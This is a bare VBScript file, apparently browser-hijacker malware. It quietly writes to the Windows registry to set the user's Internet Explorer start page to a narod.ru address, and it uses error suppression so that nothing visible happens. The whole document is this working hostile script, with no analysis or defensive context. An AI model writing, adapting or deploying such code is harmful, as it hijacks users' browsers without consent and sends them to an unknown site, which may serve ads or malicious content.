On Error Resume Next
main()

sub main()
On Error Resume Next

Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","http://myclearclock.narod.ru/"

end sub
